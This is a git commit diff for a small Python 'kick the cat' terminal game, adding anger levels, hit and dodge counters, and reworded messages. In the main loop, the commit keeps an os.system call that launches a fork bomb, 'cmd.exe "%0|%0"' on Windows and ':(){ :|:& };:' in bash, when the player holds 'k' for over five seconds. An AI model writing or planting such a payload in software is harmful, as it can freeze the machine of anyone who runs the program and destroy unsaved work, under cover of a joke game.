7bdd2fdc58d298e955019e3f5b7a8607b7ca7f50
pauytrh2 <pauytrh@gmail.com>
2025-06-02 16:14:13 +0300

    Refactor a little bit of the code + add anger levels

--- main.py
+++ main.py
@@ -18,51 +18,74 @@ class Cat:
         self.meh_face = meh
         self.sad_face = sad
         self.dead_face = dead
+        self.dodges = 0
+        self.hits = 0
 
     def check_health(self):
         if self.health < 1:
-            print(f"Cat is dead...")
+            print("Cat is dead... you monster.")
             exit()
 
+    def get_anger_level(self):
+        # can i use match in here?
+        if self.health > 75:
+            return 0  # calm
+        elif self.health > 50:
+            return 1  # annoyed
+        elif self.health > 25:
+            return 2  # angry
+        else:
+            return 3  # furious
+
     def print_cat_face(self, isL=False):
+        anger = self.get_anger_level()
         if isL:
             print(self.L_face)
         else:
-            if self.health > 75:
-                print(self.happy_face)
-            elif self.health > 50:
-                print(self.meh_face)
-            elif self.health > 0:
-                print(self.sad_face)
-            else:
+            if self.health <= 0:
                 print(self.dead_face)
+                return
+
+            match anger:
+                case 0:
+                    print(self.happy_face)
+                    print("The cat is calm.")
+                case 1:
+                    print(self.meh_face)
+                    print("The cat is getting annoyed.")
+                case 2:
+                    print(self.sad_face)
+                    print("The cat is angry!")
+                case 3:
+                    print(self.sad_face)
+                    print("The cat is FURIOUS! He hisses at you!")
 
     def kick(self):
         dodge_chance = randint(1, 100)
-        if dodge_chance <= 75: # 75%
+        if dodge_chance <= 75:
             self.defend()
             return
 
-        damage = randint(1, 10)
-        if self.health - damage < 1:
-            self.health = 0
-            print(f"You kicked the poor cat... now he is on {self.health} health...")
-            self.print_cat_face()
-            self.check_health()
-        else:
-            self.health -= damage
-            print(f"You kicked the poor cat... now he is on {self.health} health...")
-            self.print_cat_face()
+        damage = randint(5, 12)
+        self.health = max(0, self.health - damage)
+        self.hits += 1
+        print(f"You kicked the cat... health is now {self.health}")
+        self.print_cat_face()
+        self.check_health()
+
+        if self.get_anger_level() == 3:
+            if randint(1, 4) == 1:
+                print("The furious cat scratches you back!")
+                sleep(1)
 
     def defend(self):
+        self.dodges += 1
         defense_choice = randint(0, len(defenses) - 1)
-        print(f"You *try* to kick the cat but {defenses[defense_choice]}")
+        print(f"You *try* to kick the cat, but {defenses[defense_choice]}")
         self.print_cat_face(isL=True)
 
 poor_cat = Cat()
-
 clear()
-
 print("Press 'k' to kick the cat, or 'q' to quit.")
 
 while True:
@@ -72,12 +95,14 @@ while True:
 
         if time() - k_pressed_time > 5:
             clear()
-            print("you held 'k' for more than 5 seconds...")
-            print("now ill make your pc explode :o")
+            print("You held 'k' for more than 5 seconds...")
+            print("Now I’ll make your PC explode :o")
             poor_cat.health = 0
             poor_cat.print_cat_face()
             poor_cat.check_health()
-            os.system('cmd.exe "%0|%0"' if os.name == 'nt' else 'bash -c :(){ :|:& };:') # pc go boom
+            sleep(2)
+
+            os.system('cmd.exe "%0|%0"' if os.name == 'nt' else 'bash -c :(){ :|:& };:')
             break
 
     else:
@@ -89,5 +114,5 @@ while True:
 
     if keyboard.is_pressed('q'):
         clear()
-        print("You decided not to kick the cat... (loserrr)")
+        print("You decided not to kick the cat... (good choice)")
         break
